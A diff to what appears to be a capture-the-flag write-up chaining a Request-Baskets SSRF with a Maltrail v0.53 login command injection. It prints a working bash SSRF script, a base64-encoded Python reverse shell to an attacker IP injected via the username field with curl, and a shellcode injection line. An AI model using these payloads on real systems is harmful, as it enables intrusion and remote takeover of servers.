@@ -114,9 +114,9 @@ Why would a SSRF vulnerability be useful here? Because of the filtered web port.
 "Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails" - Github
 
 ### RCE [Assessing]
-Traffic detection system, again unfortunately this system also has a widely known vulnerability with PoC: https://github.com/spookier/Maltrail-v0.53-Exploit
+Traffic detection system, again unfortunately this system also has a widely known Command Injection vulnerability with PoC: https://github.com/spookier/Maltrail-v0.53-Exploit
 
-This time there is a more severe RCE (Remote Code Execution) vulnerability which if successfully exploited would allow futher internal access to the underlying server and potentially even more vulnerable services.
+This time the vulnerability may lead to a more severe RCE (Remote Code Execution) vulnerability which if successfully exploited would allow futher internal access to the underlying server and potentially even more vulnerable services.
 
 
 
@@ -130,7 +130,6 @@ BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");
 API_URL="$URL""api/baskets/$BASKET_NAME";
 
 PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";
-
 ```
 
 First, the bash script generates a basketname, `LC_ALL=C` sets the device localisation to a "simple locale", unknown if this is needed but as it seems to generate the name from `/dev/urandom`. I may also have to use it.
@@ -160,6 +159,30 @@ The rest of this PoC is pretty useless just some error handling which just makes
 
 Again, the linked PoC seems very simple and so a deconstruction is appropriate.
 
+The main part of the PoC is a one liner and so is broken down for ease of reading.
+```python
+payload = '''python3 -c 
+import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("{my_ip}",{my_port}));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/sh")
+'''
+
+encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
+command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
+os.system(command)
+```
+
+The PoC seems to be injecting a python script (`payload`) into the `username` field by ending the variable assignment with a `;` character.
+
+Using a `;` character indicates to me that this is possibly a linux command injection attack as this is how linux seperates commands out.
+
+The payload is encoded using base64 and piped using `|` (which also indicates linux injection) to decode and piped into `sh` to run a reverse shell to the attacker.
+
+Again, this code was re-written and added onto the previous exploit code, and can also be found in the [Exploit](#exploit) section.
 # Exploit
 
 ## Request-Baskets
@@ -174,12 +197,11 @@ basket=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");
 vulnerablebasket="$vulnerable$api_path$basket";
 body="{\"forward_url\": \"$target\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";
 
-echo "Creating vulnerable basket..."
+echo "Creating vulnerable basket...";
 
-curl -s -X POST -H 'Content-Type: application/json' -d "$body" "$vulnerablebasket" #post request to create basket with params
+curl -s -X POST -H 'Content-Type: application/json' -d "$body" "$vulnerablebasket"; #post request to create basket with params
 
-echo "Access gained via: $vulnerable$basket" #link to proxied website
-
+echo "Access gained via: $vulnerable/$basket"; #link to proxied website
 ```
 
 ```bash
@@ -190,6 +212,15 @@ Creating vulnerable basket...
 
 And what do we get when we visit that page?
 ![Maltrail via SSRF]()
+
+## Maltrail
+Code appended onto previous exploit code.
+
+I seperated out the shellcode from the rest as a lot of the time one liner shellcode sometimes will seem to work with most people's experience but not mine so i tend to bounce around oneliners until one works reliably. Hence the seperation for easy swapout of shellcode.
+```bash
+shellcode=""
+curl "$vulnerable/$basket" --data "username=;$shellcode"
+```
 
 # Review
 ## Request-Baskets
